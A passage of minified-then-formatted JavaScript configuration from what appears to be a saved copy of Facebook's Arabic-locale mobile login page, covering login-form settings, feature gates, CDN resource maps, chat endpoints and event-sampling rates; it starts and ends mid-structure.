                ["o8kSYhILomTbOsVFLQK7nxD3"],
              ],
              [
                "BrowserPrefillLogging@7653aeb6f6678d683381b1b5a518ce4c",
                "initContactpointFieldLogging",
                [],
                [{ contactpointFieldID: "m_login_email", serverPrefill: "" }],
              ],
              [
                "MHeaderTransparencyTooltip@885e97f9110d12205dc512db512b21c6",
                "monitorTooltipBannerToggle",
                ["__elem_df6b4e4f_0_0_t8"],
                [
                  { __m: "__elem_df6b4e4f_0_0_t8" },
                  "login",
                  1187,
                  "normal_header",
                ],
              ],
              [
                "BrowserPrefillLogging@07289193c7c4fa9b11d8ac305b830f37",
                "initPasswordFieldLogging",
                [],
                [{ passwordFieldID: "m_login_password" }],
              ],
              [
                "PlatformDialogCBTSetter@34f3c028d02299e368fd51850947afc1",
                "setCBTInFormAndLog",
                ["__elem_921b58ef_0_0_CR"],
                [
                  { __m: "__elem_921b58ef_0_0_CR" },
                  "client_logged_out_init_impression",
                ],
              ],
              [
                "MLoginView@d5e83c772ca206a6b4cf1d9a22f42301",
                "disableOnSubmit",
                ["__elem_921b58ef_0_0_CR", "__elem_7216e2ae_0_0_DX"],
                [
                  { __m: "__elem_921b58ef_0_0_CR" },
                  { __m: "__elem_7216e2ae_0_0_DX" },
                ],
              ],
              [
                "MLoginController@03b8af3313be23ffbb4b4040d85f1a31",
                "initRegButton",
                ["__elem_7216e2ae_0_1_Jy"],
                [
                  {
                    root: { __m: "__elem_7216e2ae_0_1_Jy" },
                    regURI: "/reg-no-deeplink/?cid=103",
                    useRegToLogin: true,
                  },
                ],
              ],
              [
                "MLoginController@988a2b56f6c60de106799bf6a85c4dfc",
                "initLoginForm",
                ["__elem_de5177dd_0_0_8s"],
                [
                  {
                    root: { __m: "__elem_de5177dd_0_0_8s" },
                    ajaxURI:
                      "/login/device-based/login/async/?refsrc=deprecated&lwv=100",
                    clearOnDelete: false,
                    listenKeyDown: false,
                    isTwoStepsLogin: false,
                    isActionLoggingEnabled: true,
                    isCredsManagerEnabled: false,
                    isCredsSavingEnabled: true,
                    isPasswordlessEnabled: false,
                    doNotShowUserHeader: false,
                    shouldWaitForPasswordSave: false,
                    onErrorRegURI: "/r.php",
                    shouldAutoLandOnStep2: false,
                    shouldPrefillJioHeaderForRegFromLogin: false,
                    shouldProcessUserConsentForTokenHeader: false,
                    shouldProcessUserConsentForHeader: false,
                    shouldShowSmartLockSelector: false,
                    shouldRunBotDetection: false,
                    clearPrefillMaskOnKeydown: false,
                    datrCookie: "o8kSYhILomTbOsVFLQK7nxD3",
                    pubKeyData: {
                      publicKey:
                        "6ec1e16026b79696fd361e7fcc1b714b3408df0f30f2b9e2dab07c9d4e5dc442",
                      keyId: 147,
                    },
                    shouldUseEmailDomainTypeahead: false,
                    showDuoLikePasswordless: false,
                    showSingleStepDuoLikePasswordless: false,
                    trackingPreference: "install_from_passwordless_flow",
                  },
                ],
              ],
              ["__inst_dfbc3ade_0_0_vL@33ba751942d3f9fb38d59d040ec1867b"],
              ["MTouchable@3b212b300277a1e20dc5040324b5397a"],
              [
                "MPasswordPlainTextToggle@b10d3e8d9db4723da3931b19d5ed6e53",
                "init",
                [
                  "__elem_e24cb174_0_0_Ol",
                  "__elem_7216e2ae_0_2_FU",
                  "__elem_e03291d5_0_0_7V",
                  "__elem_e03291d5_0_1_0S",
                ],
                [
                  { __m: "__elem_e24cb174_0_0_Ol" },
                  { __m: "__elem_7216e2ae_0_2_FU" },
                  { __m: "__elem_e03291d5_0_0_7V" },
                  { __m: "__elem_e03291d5_0_1_0S" },
                ],
              ],
              [
                "ServiceWorkerLoginAndLogoutListener@3ea32e37519282c365e794eaccd882fe",
                "listen",
                [],
                ["login_button_block", "login", "/sw?s=push", null],
              ],
              [
                "MBlockingTouchable@73ba825c6a4900f23efbe19d89ff4ca2",
                "init",
                ["__elem_e980dec4_0_0_nQ"],
                [{ __m: "__elem_e980dec4_0_0_nQ" }],
              ],
              [
                "AccessibilityWebVirtualCursorClickLogger@146e64d49b4902f5e153282b4aec2162",
                "init",
                ["__elem_49f6b607_0_0_T2"],
                [[{ __m: "__elem_49f6b607_0_0_T2" }]],
              ],
              ["GHLSurvey@00bf18957604dc41d21e2ad890b64c93", "survey", [], []],
              ["MScrollPositionSaver@90458efda1a5e7f5cc30c7f07d99d390"],
              ["InitMAjaxify@6d41c47794374b6f863e5eb8c4abd03d"],
              [
                "MSeoDirectoryLinks@1c4d3c280f25c6dd52b97c4c62696910",
                "initLinks",
                ["__elem_717bb1ae_0_0_tE", "__elem_ad2bcfb1_0_0_yy"],
                [
                  {
                    visible: false,
                    toggleButton: { __m: "__elem_717bb1ae_0_0_tE" },
                    linksContainer: { __m: "__elem_ad2bcfb1_0_0_yy" },
                    expandButton: { __m: "__elem_717bb1ae_0_0_tE" },
                    collapseButton: { __m: "__elem_717bb1ae_0_0_tE" },
                  },
                ],
              ],
              [
                "MLynx@929dae06d521eb30c1d1e7e4f29a29ac",
                "setupDelegation",
                [],
                [],
              ],
              ["MLogoutClearCache@019e58c1e04fa2aa74a73f7f9a8f1128"],
              [
                "LoadingIndicator@b7e7b0b6d74adb4e42d7d9a0e4e715db",
                "init",
                [
                  "__elem_eed16c0a_0_0_bH",
                  "__elem_a588f507_0_0_E6",
                  "__elem_a588f507_0_1_EQ",
                ],
                [
                  { __m: "__elem_eed16c0a_0_0_bH" },
                  { __m: "__elem_a588f507_0_0_E6" },
                  { __m: "__elem_a588f507_0_1_EQ" },
                ],
              ],
              ["MPageError@02dc86736946409fb1c5519f0065dd07"],
              ["MPageHeaderAccessibility@b83e8da251ae10f5beec73361b189902"],
              [
                "MBlockingTouchable@670bf58c48abb64ce9f75b2b5cf70d95",
                "init",
                ["__elem_0cdc66ad_0_0_3d"],
                [{ __m: "__elem_0cdc66ad_0_0_3d" }],
              ],
              [
                "MBlockingTouchable@5d20edc24167f36fd4c2e743c5cbc505",
                "init",
                ["__elem_0cdc66ad_0_1_1v"],
                [{ __m: "__elem_0cdc66ad_0_1_1v" }],
              ],
              [
                "MLoadingIndicator@2b5331362ca2394ac258324926bdb806",
                "init",
                [],
                ["u_0_a_Df"],
              ],
              [
                "QuickMarkersBlue@d3f04973bc60dead7f1ba4bbbd6c2912",
                "startNewEvent",
                [],
                [
                  {
                    event_id: "7106979666827724507",
                    script_path: "/wap/index.php",
                    weight: 1,
                  },
                ],
              ],
              ["ErrorLogging@5af7eda34e876ea3a90cd2968afe85be"],
              ["LogHistoryListeners@abecf12dd255fa1bd793dee0f21b02c3"],
              [
                "ScriptPath@60104bf59bea9ecee3a20caa064db507",
                "set",
                [],
                [
                  "/wap/index.php",
                  "4e6eefd9",
                  { imp_id: "0xAo7hISDsmhWz7Y4", ef_page: null },
                ],
              ],
              [
                "MCommentViewportTracking@078eda7792f5a1b5fd9a1dc993c07a18",
                "singleton",
                [],
                [
                  {
                    enabled: true,
                    debug_console: false,
                    debug_html: false,
                    idle_timeout: 5000,
                    min_duration_to_log: 100,
                    min_visible_size: 200,
                  },
                ],
              ],
              [
                "MLogging@f2ad5b52294a17fd122686f56c9c1a75",
                "main",
                [],
                [{ refid: 8 }],
              ],
              [
                "RemoteDevice@a13d39ec45715f8e73ec330462b38b0b",
                "init",
                [],
                [{ performHardwareDetection: false, hashId: null, vpd: false }],
              ],
              ["Artillery@07a6123e5d1285ec2f69d94655f00c48"],
              ["MLinkHack@5c3f98cb1b3e7b47ff4ff1b002743f73"],
              ["MModalDialogInit@9b20bb77f8c8e9426f2ff229eb3d25fd"],
              [
                "MVerifyCache@450e414511b53ee31f9a90814223b52f",
                "main",
                [],
                [{ viewer: 0 }],
              ],
              ["EventProfiler@9347f8d3d9882e36f0bb8c8a87018068"],
              [
                "MPageNavigationTracking@6a31707d72af19743c62ffc175dc0a4f",
                "init",
                [],
                [],
              ],
              [
                "FalcoLoggerTransports@8eaafd0f46ec8d185f1d5a0259403b55",
                "attach",
                [],
                [],
              ],
              [
                "ScriptPathLogger@211b904434ecfb6768fd199a8ab9ed53",
                "startLogging",
                [],
                [],
              ],
              [
                "MTimeSpentBitArrayLogger@6a891d0e4adec5ccad3520690514a205",
                "init",
                [],
                ["m", false],
              ],
              ["MCoreDeferred@777eb7ac66e5d999d16b85227001454e"],
              ["MqttLongPollingRunner@bc5557eb80e55a95230a5b9da703f1bc"],
              ["BanzaiScuba_DEPRECATED@bc5557eb80e55a95230a5b9da703f1bc"],
              ["FbtLogging@bc5557eb80e55a95230a5b9da703f1bc"],
              ["IntlQtEventFalcoEvent@bc5557eb80e55a95230a5b9da703f1bc"],
              ["MPageControllerImpl@bc5557eb80e55a95230a5b9da703f1bc"],
              ["LogWebMemoryUsageFalcoEvent@bc5557eb80e55a95230a5b9da703f1bc"],
              ["MPageFetcherImpl@bc5557eb80e55a95230a5b9da703f1bc"],
              ["json-bigint@bc5557eb80e55a95230a5b9da703f1bc"],
              [
                "RequireDeferredReference@507a9390a3323f8e470011473b45ad85",
                "unblock",
                [],
                [
                  [
                    "MqttLongPollingRunner",
                    "BanzaiScuba_DEPRECATED",
                    "FbtLogging",
                    "IntlQtEventFalcoEvent",
                    "MPageControllerImpl",
                    "LogWebMemoryUsageFalcoEvent",
                    "VisualCompletionGating",
                    "MPageFetcherImpl",
                    "json-bigint",
                  ],
                  "sd",
                ],
              ],
              [
                "RequireDeferredReference@507a9390a3323f8e470011473b45ad85",
                "unblock",
                [],
                [
                  [
                    "MqttLongPollingRunner",
                    "BanzaiScuba_DEPRECATED",
                    "FbtLogging",
                    "IntlQtEventFalcoEvent",
                    "MPageControllerImpl",
                    "LogWebMemoryUsageFalcoEvent",
                    "VisualCompletionGating",
                    "MPageFetcherImpl",
                    "json-bigint",
                  ],
                  "css",
                ],
              ],
            ],
            pre_display_requires: [
              [
                "AddressBar@7dde8024a2747a47f607c91f57e44c7e",
                "setupLoadListener",
                [],
                [],
                4,
              ],
              [
                "MobileBigPipeStratcomProxy@fc47525a03a8240635f7bcde5775f102",
                "init",
                [],
                [],
                4,
              ],
              ["Stratcom@1fcc96742ff558fac8b14317451b9951", "init", [], [], 4],
              ["MViewport@16ad2e65edf7ef3ba924b2e9965b05d1", "init", [], [], 4],
              [
                "ViewportDimensions@26915c220a8c1a4804377bfbad659b4c",
                "init",
                [],
                [],
                4,
              ],
              [
                "MPageController@4288f56bef7765b705195d952460f75b",
                "init",
                [],
                [],
                4,
              ],
              ["onSyncTTI@c79fb1b573ba7742503c5d1c0a384880", "run", [], [], 4],
              ["MLiteInit@eaacf13d8e72e0f840379221d8b16501", "init", [], [], 4],
            ],
          },
          hsrp: {
            hsdp: {
              bxData: {
                875231: {
                  uri: "https://z-m-static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico",
                },
              },
              clpData: {
                2511: { r: 1, s: 1 },
                1744057: { r: 500, s: 1 },
                1744058: { r: 5000, s: 1 },
                1744059: { r: 10000, s: 1 },
                1744060: { r: 1000, s: 1 },
                1814852: { r: 1 },
                1838142: { r: 1, s: 1 },
                1744178: { r: 1, s: 1 },
                1942319: { r: 1, s: 1 },
                1836368: { r: 1, s: 1 },
                1828905: { r: 1, s: 1 },
                1842512: { r: 1 },
                1829319: { r: 1 },
                1829320: { r: 1 },
                1843988: { r: 1 },
                1949898: { r: 1 },
                1848815: { r: 10000, s: 1 },
                1765264: { r: 1, s: 1 },
              },
              gkxData: {
                762: { result: false, hash: "AT7XePNdehhQhxt4Tzs" },
                2795: { result: false, hash: "AT5ilL0A5sDVhuaB8F0" },
                3400: { result: false, hash: "AT5LV5sAIJng7-zczGg" },
                4984: { result: true, hash: "AT71gKcp5TYQzjDdbeg" },
                5156: { result: false, hash: "AT5GfXPwqB3i2XNzFf8" },
                6049: { result: false, hash: "AT58f153NfQ38W0Rtao" },
                676837: { result: false, hash: "AT4N8wBZA8ctCdHwvi0" },
                778292: { result: false, hash: "AT574OhXHwX0kRP2e1A" },
                832242: { result: false, hash: "AT7QZmREZ7b0HQdOLj0" },
                945829: { result: true, hash: "AT6KFs8jy_GkmgnU0SU" },
                968609: { result: true, hash: "AT7nKteWCVYK6uN6H0A" },
                1001007: { result: false, hash: "AT54HpnriRBxXJ_MioQ" },
                1066746: { result: false, hash: "AT55_E5b8Sj7u5rUzJU" },
                1166607: { result: false, hash: "AT7xrOkGBcaF8I5uVek" },
                1167394: { result: false, hash: "AT7BpN-tlUPwbIIFbII" },
                1234252: { result: true, hash: "AT5cOYNKVqwFmemeN1Q" },
                2772: { result: false, hash: "AT5Eu244WIce7iwqgAk" },
                3752: { result: false, hash: "AT6eS5UTkkMp_xbPGF4" },
                3820: { result: false, hash: "AT6sMf-XMjfPaRKv8qk" },
                3831: { result: false, hash: "AT4W23lQ0XxAZniME8Q" },
                4075: { result: false, hash: "AT4_ZQi0sTjSt-Rxs-k" },
                676781: { result: false, hash: "AT4-DnA47xPbjtkwPcg" },
                712819: { result: false, hash: "AT79nTpb4gT-yu86iVQ" },
                1217157: { result: false, hash: "AT6B7YmllOsArnK6aGA" },
                1224637: { result: false, hash: "AT7JRluWxuwDm3Xz1J8" },
                1554827: { result: false, hash: "AT7zueGLhGo0cT5xu-Q" },
                1738486: { result: false, hash: "AT4cX37oQco6DwhUOsU" },
                910664: { result: false, hash: "AT69YyFAmMObhORGQtE" },
                1511920: { result: true, hash: "AT6pY2ROWoYnl3_cGNs" },
                1059877: { result: false, hash: "AT53XV4TWT4lc3_myYI" },
                1070739: { result: false, hash: "AT5rKAR6NQAuoRaHLew" },
                676811: { result: false, hash: "AT4zC0IqvJCbKsUekn0" },
                676812: { result: false, hash: "AT6FULe6g-qrrrQdn2o" },
                820050: { result: true, hash: "AT7bjlcFFlowDw-SaQ8" },
                985697: { result: false, hash: "AT6gOJD7fT0UjmgD5J0" },
                148: { result: false, hash: "AT5V6Me6WVwsRI3wxy8" },
                5525: { result: false, hash: "AT56gpXxsmc6rAjxsyw" },
                2223: { result: false, hash: "AT4s3JaAt9nQ6ucma2c" },
                2341: { result: false, hash: "AT7nNd913_uqf_cR90Q" },
                726410: { result: true, hash: "AT7w-jbTa3ueodj3LN8" },
                5541: { result: true, hash: "AT70V-Q_zfEykznOJrk" },
                862436: { result: false, hash: "AT7YsAcWL8-1WZrOWL0" },
                1099893: { result: false, hash: "AT5kly2LSZV_DKGRWdc" },
                3499: { result: false, hash: "AT5l5tI3kdeSuUxUWhA" },
              },
              qexData: {
                37: { r: null },
                129: { r: null },
                130: { r: null },
                131: { r: null },
                317: { r: null },
                656: { r: null },
                657: { r: null },
                658: { r: null },
                659: { r: null },
                660: { r: null },
                91: { r: null },
                123: { r: null },
                648: { r: null },
                650: { r: null },
                651: { r: null },
              },
              qplData: { 891: { r: 1 } },
            },
            hblp: {
              consistency: { rev: 1005650017 },
              rsrcMap: {
                "M5XDl+E": {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yk/r/J-zOLqpAwWd.js?_nc_x=Ij3Wp8lg5Kz",
                },
                VvVFw8n: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yn/r/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz",
                },
                hhX2dwf: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y3/r/ay9DpwmRi_i.js?_nc_x=Ij3Wp8lg5Kz",
                },
                "LrzNtx/": {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y_/r/8nwDm3pgofH.js?_nc_x=Ij3Wp8lg5Kz",
                },
                lZZnVFH: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yg/r/ngoBhFBLB-O.js?_nc_x=Ij3Wp8lg5Kz",
                },
                w5JLkSF: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3iW1x4/y1/l/ar_AR/McENtLtnSjE.js?_nc_x=Ij3Wp8lg5Kz",
                },
                FJqL2Al: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz",
                },
                vF0qXZY: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ym/r/1c-S99MMZKC.js?_nc_x=Ij3Wp8lg5Kz",
                },
                bJ922yg: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz",
                },
                txMBmcX: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3i26U4/y3/l/ar_AR/SR9WpylB8u4.js?_nc_x=Ij3Wp8lg5Kz",
                },
                hMoWeWt: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3iNZC4/yQ/l/ar_AR/bGTosVsgjZr.js?_nc_x=Ij3Wp8lg5Kz",
                },
                EdRhDux: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yZ/r/s3nxV5AJNPb.js?_nc_x=Ij3Wp8lg5Kz",
                },
                NfvTfKe: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3i8Eb4/yG/l/ar_AR/aK2Vg0xp7su.js?_nc_x=Ij3Wp8lg5Kz",
                },
                HPolq9r: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3iEde4/yu/l/ar_AR/dqwZZfrv5U-.js?_nc_x=Ij3Wp8lg5Kz",
                },
                fVaBgHx: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y3/r/ENNZJttsiwM.js?_nc_x=Ij3Wp8lg5Kz",
                },
                MOwxiEu: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yG/r/Z7yDY2JPbpt.js?_nc_x=Ij3Wp8lg5Kz",
                },
                seuBOnl: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yh/r/KL8NwCaLOuW.js?_nc_x=Ij3Wp8lg5Kz",
                },
                TUxV68S: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ys/r/AEurEMwqHIo.js?_nc_x=Ij3Wp8lg5Kz",
                },
              },
              compMap: {
                ODS: { r: ["M5XDl+E"], be: 1 },
                QPLInspector: { r: ["VvVFw8n"], be: 1 },
                TransportSelectingClientSingleton: {
                  r: ["hhX2dwf", "M5XDl+E"],
                  rds: {
                    m: [
                      "ContextualConfig",
                      "BladeRunnerClient",
                      "DGWRequestStreamClient",
                      "MqttLongPollingRunner",
                      "BanzaiScuba_DEPRECATED",
                      "FbtLogging",
                      "IntlQtEventFalcoEvent",
                    ],
                    r: ["58kqqKw", "LrzNtx/", "lZZnVFH", "w5JLkSF", "FJqL2Al"],
                  },
                  be: 1,
                },
                RequestStreamCommonRequestStreamCommonTypes: {
                  r: ["hhX2dwf"],
                  be: 1,
                },
                Cookie: {
                  r: ["M5XDl+E"],
                  rds: { m: ["BanzaiScuba_DEPRECATED"], r: ["58kqqKw"] },
                  be: 1,
                },
                WebSpeedInteractionsTypedLogger: {
                  r: ["M5XDl+E", "TUxV68S", "FJqL2Al", "58kqqKw"],
                  rds: {
                    m: [
                      "FbtLogging",
                      "IntlQtEventFalcoEvent",
                      "BanzaiScuba_DEPRECATED",
                    ],
                  },
                  be: 1,
                },
                PerfXSharedFields: { r: ["M5XDl+E"], be: 1 },
              },
            },
          },
          allResources: [
            "MoYpVB9",
            "LkM1EDH",
            "M5XDl+E",
            "58kqqKw",
            "bGPbhqq",
            "ObVQb8y",
            "zc1gkMl",
            "vF0qXZY",
            "bJ922yg",
            "LrzNtx/",
            "lZZnVFH",
            "txMBmcX",
            "hMoWeWt",
            "w5JLkSF",
            "EdRhDux",
            "NfvTfKe",
            "HPolq9r",
            "fVaBgHx",
            "MOwxiEu",
            "seuBOnl",
            "FJqL2Al",
          ],
        });
      });
    </script>
    <script>
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.setPageID("7106979666827724507-0");
      });
      CavalryLogger.setPageID("7106979666827724507-0");
    </script>
    <script nonce="">
      (function () {
        var n = now_inl();
        requireLazy(["__bigPipe"], function (bigPipe) {
          bigPipe.beforePageletArrive("last_response", n);
        });
      })();
    </script>
    <script nonce="">
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.onPageletArrive({
          id: "last_response",
          phase: 63,
          last_in_phase: true,
          the_end: true,
          jsmods: {
            define: [
              ["ChannelClientConfig", [], {}, 395],
              ["MercuryConfig", [], {}, 35],
              [
                "MqttWebConfig",
                [],
                {
                  fbid: "0",
                  appID: 219994525426954,
                  endpoint: "wss://edge-chat.facebook.com/chat",
                  pollingEndpoint: "https://edge-chat.facebook.com/mqtt/pull",
                  subscribedTopics: [],
                  capabilities: 10,
                  clientCapabilities: 3,
                  chatVisibility: false,
                  hostNameOverride: "",
                },
                3790,
              ],
              [
                "MqttPublishTimeoutConfig",
                [],
                { mqttPublishTimeoutMs: 90000 },
                4266,
              ],
              [
                "MobileWebMessageTypesSitevarConfig",
                [],
                {
                  ChatProxySupportedMessageTypes: {
                    __map: [
                      ["anbox", true],
                      ["chatproxy-presence", true],
                      ["confirm_contactpoint", true],
                      ["delta", true],
                      ["deltaflow", true],
                      ["deltaflowreject", true],
                      ["friend_requests_seen", true],
                      ["friending_state_change", true],
                      ["inbox", true],
                      ["jewel_friending_notifs", true],
                      ["jewel_requests_add", true],
                      ["jewel_requests_remove_old", true],
                      ["live_poke", true],
                      ["m_notification", true],
                      ["mobile_requests_count", true],
                      ["nav_update_counts", true],
                      ["notifications_read", true],
                      ["notifications_seen", true],
                      ["onevc", true],
                      ["privacy_changed", true],
                      ["qprimer", true],
                      ["skywalker", true],
                      ["typ", true],
                      ["webrtc", true],
                    ],
                  },
                  MQTTMigrationExcludeMessageTypes: {
                    __map: [
                      ["anbox", true],
                      ["chatproxy-presence", true],
                      ["delta", true],
                      ["deltaflow", true],
                      ["deltaflowreject", true],
                      ["onevc", true],
                      ["qprimer", true],
                      ["skywalker", true],
                      ["typ", true],
                      ["webrtc", true],
                    ],
                  },
                },
                4273,
              ],
              [
                "MqttWebDeviceID",
                [],
                { clientID: "95b779dc-e126-40d2-a143-ad7daa92ac3d" },
                5003,
              ],
              ["IntlCurrentLocale", [], { code: "ar_AR" }, 5954],
              [
                "MRegTopDomainsConfig",
                [],
                {
                  topEmailDomains: [
                    "gmail.com",
                    "hotmail.com",
                    "yahoo.com",
                    "gamil.com",
                    "outlook.com",
                  ],
                },
                4220,
              ],
              [
                "USIDMetadata",
                [],
                {
                  browser_id: "?",
                  tab_id: "",
                  page_id: "Prd6g6210gpj92",
                  transition_id: 0,
                  version: 6,
                },
                5888,
              ],
              [
                "MTouchableSyntheticClickGK",
                [],
                { USE_SYNTHETIC_CLICK: true },
                368,
              ],
              ["BrowserPaymentHandlerConfig", [], { enabled: false }, 3904],
              [
                "BrowserPushPubKey",
                [],
                {
                  appServerKey:
                    "BIBn3E_rWTci8Xn6P9Xj3btShT85Wdtne0LtwNUyRQ5XjFNkuTq9j4MPAVLvAFhXrUU1A9UxyxBA7YIOjqDIDHI",
                },
                4806,
              ],
              [
                "DirectDownloadEvents",
                [],
                {
                  downloadFb4aViaShimClick: "download_fb4a_via_shim_click",
                  upgrade_page_imp: "upgrade_page_imp",
                  upgrade_button_click: "upgrade_button_click",
                  sideload_installer_as_preloads:
                    "sideload_installer_as_preloads",
                  try_open_appmanager_deep_link_web_install:
                    "try_open_appmanager_deep_link_web_install",
                  logged_out_banner_google_play_redirect_failed:
                    "logged_out_banner_google_play_redirect_failed",
                  logged_out_banner_impression_client:
                    "logged_out_banner_impression_client",
                  logged_out_banner_upgrade_button_click:
                    "logged_out_banner_upgrade_button_click",
                },
                2368,
              ],
              [
                "cr:686",
                [],
                {
                  __rc: [
                    null,
                    "Aa2L1qWLb3pE1DFwIiczKmwedEMJCNlJrniZL-Mz7mFGA1sLe8kVqeCta8Xymn2Z_qgj64Pq3gQ_0eJpMlg6eGMgCQ",
                  ],
                },
                -1,
              ],
              [
                "cr:1069930",
                [],
                {
                  __rc: [
                    null,
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "cr:1083116",
                ["XAsyncRequest"],
                {
                  __rc: [
                    "XAsyncRequest",
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "cr:1083117",
                [],
                {
                  __rc: [
                    null,
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "cr:1984081",
                [],
                {
                  __rc: [
                    null,
                    "Aa3m4z9MC3ZnClajGNF8khi2NqI_a-IXWF93LDycpX_Y4qdKaP_0xr2FlpgHyyB-gWXaDphCywf324JLOIW7tYfow5AZ",
                  ],
                },
                -1,
              ],
              [
                "cr:334",
                ["ghlTestUBTFacebook"],
                {
                  __rc: [
                    "ghlTestUBTFacebook",
                    "Aa0O8X1ODTt5A_GEUQXaV8Xf5veFwmES0j0DaQ3qebfrf7HV4Amg5K3Da_idbO4KwhAxmp02rHSKAZgD6rzq292LLQ",
                  ],
                },
                -1,
              ],
              [
                "cr:1088657",
                [],
                {
                  __rc: [
                    null,
                    "Aa1wE1lyouzoXFLcWg02Mv5X8n5RXZzYTcVKSXqtN1vLnXIqi8Zsy-8a_gONu2jJXsGh0mfSLQZOwmcBKLF9Zzo",
                  ],
                },
                -1,
              ],
              [
                "cr:1543261",
                [],
                {
                  __rc: [
                    null,
                    "Aa3Yr7vm3dAPnDlVPQSlPB5w0FOIT-_U8Pln7cHbvo_szlJe4mLrAWks7ahUNT2T8zayEJbD_hVvkyBiUXYC27BM",
                  ],
                },
                -1,
              ],
              [
                "cr:708886",
                ["EventProfilerImpl"],
                {
                  __rc: [
                    "EventProfilerImpl",
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "cr:1094907",
                [],
                {
                  __rc: [
                    null,
                    "Aa0Ovz9yjqVv8JKASXyUJmEs3AxWbkhL1onXjtlo-nOVn4917JXUewqL_RgjItViJWHoumOfFYbgICg-Nrr00u8",
                  ],
                },
                -1,
              ],
              [
                "EventConfig",
                [],
                {
                  sampling: {
                    bandwidth: 0,
                    play: 0,
                    playing: 0,
                    progress: 0,
                    pause: 0,
                    ended: 0,
                    seeked: 0,
                    seeking: 0,
                    waiting: 0,
                    loadedmetadata: 0,
                    canplay: 0,
                    selectionchange: 0,
                    change: 0,
                    timeupdate: 0,
                    adaptation: 0,
                    focus: 0,
                    blur: 0,
                    load: 0,
                    error: 0,
                    message: 0,
                    abort: 0,
                    storage: 0,
                    scroll: 200000,
                    mousemove: 20000,
                    mouseover: 10000,
                    mouseout: 10000,
                    mousewheel: 1,
                    MSPointerMove: 10000,
                    keydown: 0.1,
                    click: 0.02,
                    mouseup: 0.02,
                    __100ms: 0.001,
                    __default: 5000,
                    __min: 100,
                    __interactionDefault: 200,
                    __eventDefault: 100000,
                  },
                  page_sampling_boost: 1,
                  interaction_regexes: {},
                  interaction_boost: {},
                  event_types: {},
                  manual_instrumentation: false,
                  profile_eager_execution: false,
                  disable_heuristic: true,
                  disable_event_profiler: false,
                },
                1726,
              ],
              [
                "KillabyteProfilerConfig",
                [],
                {
                  htmlProfilerModule: null,
                  profilerModule: null,
                  depTypes: { BL: "bl", NON_BL: "non-bl" },
                },
                1145,
              ],
              [
                "QuicklingConfig",
                [],
                {
                  version: "1005650017;0;",
                  sessionLength: 30,
                  inactivePageRegex:
                    "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                  badRequestKeys: [
                    "nonce",
                    "access_token",
                    "oauth_token",
                    "xs",
                    "checkpoint_data",
                    "code",
                  ],
                  logRefreshOverhead: false,
                },
                60,
              ],
            ],
            require: [
              [
                "BDClientSignalCollectionTrigger@d05e2b515690e35153c179e589a82e67",
                "startSignalCollection",
                [],
                [
                  {
                    sc: '{"t":1637128278,"c":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}',
                    fds: 60,
                    fda: 60,
                    i: 60,
                    sbs: 1,
                    dbs: 100,
                    bbs: 100,
                    hbi: 60,
                    rt: 262144,
                    hbcbc: 2,
                    hbvbc: 0,
                    hbbi: 30,
                    sid: -1,
